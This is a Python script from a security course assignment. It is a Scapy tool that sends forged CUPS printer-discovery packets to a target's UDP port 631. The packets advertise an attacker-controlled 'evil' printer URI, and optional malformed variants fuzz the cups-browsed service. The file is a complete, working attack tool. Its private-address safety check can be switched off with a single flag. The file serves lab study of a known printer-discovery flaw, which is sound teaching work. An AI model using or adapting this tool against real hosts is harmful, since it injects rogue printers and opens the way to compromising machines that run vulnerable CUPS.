#!/usr/bin/env python3
"""
cups_attack.py: DAT505 Assignment 2 (Task 2).

Scapy-based tool to study insecure CUPS / cups-browsed printer discovery in an
ISOLATED lab. It provides the plumbing (CLI, logging, UDP send, PCAP export)
around the discovery packet you build yourself.

Scope: isolated Docker containers / VMs only. Never send to a public,
university, or third-party network.

Usage examples:
    sudo python3 cups_attack.py --target 172.18.0.2 --port 631 \
        --printer-uri "ipp://192.0.2.10:6310/printers/evil" --pcap out.pcap
    sudo python3 cups_attack.py --target 172.18.0.2 --count 3 --interval 1.0 -v
"""
import argparse
import logging
import sys
import time

try:
    from scapy.all import IP, UDP, Raw, send, wrpcap
except ImportError:
    sys.stderr.write(
        "scapy is required: pip install -r requirements.txt\n"
    )
    sys.exit(1)


log = logging.getLogger("cups_attack")


# Safety guard: allow only private/loopback targets (lab), override required otherwise.
def is_lab_target(ip: str) -> bool:
    import ipaddress
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return addr.is_private or addr.is_loopback


# Legacy CUPS browse datagram: "<type> <state> <uri> \"loc\" \"info\" \"model\"".
def build_discovery_payload(args) -> bytes:
    """Return the raw UDP payload advertising the attacker-controlled printer."""
    printer_type = "0x00"
    printer_state = "3"

    uri = args.printer_uri
    name = args.printer_name

    location = "Lab"
    info = name
    make_model = "Generic Printer"

    if args.variant == "malformed-bytes":
        return b"\xff\xfe\x00 not-a-browse-packet \x01\x02"
    if args.variant == "malformed-port":
        return b'3 3 ipp://192.0.2.10:99999/printers/evil "" "" ""\n'
    if args.variant == "malformed-fields":
        return b"3 3\n"
    if args.variant == "alt-uri":
        uri = "ipp://192.0.2.10:9999/printers/evil2"
    elif args.variant == "alt-name":
        info = "MaliciousPrinterVariant"
        name = "EvilPrinter2"
    elif args.variant == "malformed-field":
        location = ""
    elif args.variant == "malformed-packet":
        return b"\xff\xfe garbage \x00 not-a-browse-announcement"

    packet_text = (
        f"{printer_type} {printer_state} {uri} "
        f"\"{location}\" \"{info}\" \"{make_model}\""
    )

    return (packet_text + "\n").encode("ascii")


def craft_packet(args, payload: bytes):
    """Wrap the payload in IP/UDP toward the target."""
    return (
        IP(dst=args.target)
        / UDP(sport=args.sport, dport=args.port)
        / Raw(load=payload)
    )


def run(args) -> int:
    if not args.allow_any_target and not is_lab_target(args.target):
        log.error(
            "Refusing target %s: not a private/loopback (lab) address. "
            "Use --allow-any-target only if you are certain it is authorized.",
            args.target,
        )
        return 2

    payload = build_discovery_payload(args)
    pkt = craft_packet(args, payload)
    log.info("Target %s:%d, payload %d bytes", args.target, args.port, len(payload))

    sent = []
    for i in range(args.count):
        send(pkt, verbose=False)
        sent.append(pkt)
        log.info("Sent discovery packet %d/%d", i + 1, args.count)
        if i + 1 < args.count:
            time.sleep(args.interval)

    if args.pcap:
        wrpcap(args.pcap, sent)
        log.info("Wrote %d packet(s) to %s", len(sent), args.pcap)

    return 0


def parse_args(argv=None):
    p = argparse.ArgumentParser(
        description="Scapy CUPS printer-discovery attack tool (isolated lab only).",
        epilog="Isolated lab use only. Never target unauthorized systems.",
    )
    p.add_argument("--target", required=True, help="victim IP (lab container/VM)")
    p.add_argument("--port", type=int, default=631, help="victim UDP port (default 631)")
    p.add_argument("--sport", type=int, default=0, help="source UDP port (0 = random)")
    p.add_argument("--printer-uri", default="ipp://192.0.2.10:6310/printers/evil",
                   help="attacker-controlled printer URI to advertise")
    p.add_argument("--printer-name", default="EvilPrinter", help="advertised printer name")
    p.add_argument("--variant", default="nominal",
                   help="label for a crafted-field variation (Task 4 needs >=3)")
    p.add_argument("--count", type=int, default=1, help="number of packets to send")
    p.add_argument("--interval", type=float, default=1.0, help="seconds between packets")
    p.add_argument("--pcap", help="write sent packets to this PCAP file")
    p.add_argument("--allow-any-target", action="store_true",
                   help="override the private/loopback-only safety check")
    p.add_argument("-v", "--verbose", action="store_true", help="debug logging")
    return p.parse_args(argv)


def main(argv=None) -> int:
    args = parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    try:
        return run(args)
    except PermissionError:
        log.error("Need root to send raw packets (try sudo).")
        return 1
    except KeyboardInterrupt:
        log.warning("Interrupted.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
